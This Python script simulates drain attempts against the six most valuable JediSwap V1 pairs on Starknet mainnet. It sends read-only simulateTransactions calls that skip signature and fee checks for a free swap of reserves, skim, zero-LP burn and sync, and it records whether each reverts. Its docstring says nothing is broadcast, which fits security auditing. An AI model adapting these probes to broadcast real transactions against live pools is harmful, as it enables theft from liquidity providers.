#!/usr/bin/env python3
"""Read-only simulateTransactions: attempted drains against top JediSwap V1 pairs.
Nothing is broadcast; retries handle the live account's nonce advancing."""
import json, time, urllib.request, urllib.error
import sn

RPC = "https://api.cartridge.gg/x/starknet/mainnet"
BASE = "/home/heisenberg/CA/jediswap-v1/analysis/"
SENDERS = ["0x2b9d17a44a0f747b6374ee5ea9fb1c2acdb1825adb0a1dd905b756617827ff9",
           "0x49e505eaf9fa33d61f472c6197ae602f92844f500b1a733d6d8e2fb4aa68291",
           "0x4678eb497e96599c92b45f342c2bd284321fe219c60a9b6293d80f0fbfa61b5"]

st = json.load(open(BASE + "pair_state.json"))
pairs = st["pairs"]
val = json.load(open(BASE + "valuation.json"))
top = sorted(val["per_pair"], key=lambda r: -r["usd"])[:6]


def sim_invoke(calldata):
    last = None
    for attempt in range(4):
        sender = SENDERS[attempt % len(SENDERS)]
        try:
            nonce = int(sn.rpc("starknet_getNonce", ["latest", sender]), 16)
        except Exception as e:
            last = str(e); continue
        tx = {"type": "INVOKE", "version": "0x1", "sender_address": hex(int(sender, 16)),
              "calldata": [hex(x) for x in calldata], "signature": [], "nonce": hex(nonce), "max_fee": "0x0"}
        payload = {"jsonrpc": "2.0", "id": 1, "method": "starknet_simulateTransactions",
                   "params": {"block_id": "latest", "transactions": [tx],
                              "simulation_flags": ["SKIP_VALIDATE", "SKIP_FEE_CHARGE"]}}
        req = urllib.request.Request(RPC, data=json.dumps(payload).encode(),
                                     headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
        try:
            with urllib.request.urlopen(req, timeout=120) as r:
                resp = json.loads(r.read().decode())
        except urllib.error.HTTPError as e:
            resp = json.loads(e.read().decode())
        if "result" in resp:
            tr = resp["result"][0]["transaction_trace"]["execute_invocation"]
            if "revert_reason" in tr:
                rr = tr["revert_reason"]
                # innermost message: last non-empty line
                lines = [l.strip() for l in rr.split("\n") if l.strip()]
                return sender, "REVERT", lines[-1][:300]
            return sender, "SUCCESS", json.dumps(tr.get("result"))[:200]
        err = resp.get("error", {})
        msg = json.dumps(err)[:200]
        if "nonce" in msg:
            last = msg; time.sleep(1.0); continue
        return None, "ERR", msg
    return None, "ERR", str(last)[:200]


out = []
for t in top:
    p = t["pair"]
    pstate = next(x for x in pairs if x["pair"] == p)
    r0 = int(pstate.get("reserve0", 0)); r1 = int(pstate.get("reserve1", 0))
    attempts = []
    if r0 > 1:
        cd = [int(p, 16), int(sn.selector("swap"), 16),
              (r0 - 1) & ((1 << 128) - 1), (r0 - 1) >> 128, 0, 0,
              int(SENDERS[0], 16), 0, 0]
        attempts.append(("free_swap_out_reserve-1_no_input", cd))
    attempts.append(("skim", [int(p, 16), int(sn.selector("skim"), 16), int(SENDERS[0], 16)]))
    attempts.append(("burn_zero_lp", [int(p, 16), int(sn.selector("burn"), 16), int(SENDERS[0], 16)]))
    attempts.append(("sync", [int(p, 16), int(sn.selector("sync"), 16)]))
    for name, cd in attempts:
        sender, status, detail = sim_invoke(cd)
        out.append({"pair": p, "attempt": name, "status": status, "detail": detail, "sender": sender})
        print(f"{p[:14]} {name:32s} -> {status:8s} {detail[:120]}")
        time.sleep(0.3)

json.dump(out, open(BASE + "sim_drain_attempts.json", "w"), indent=1)
print("saved", len(out), "results")
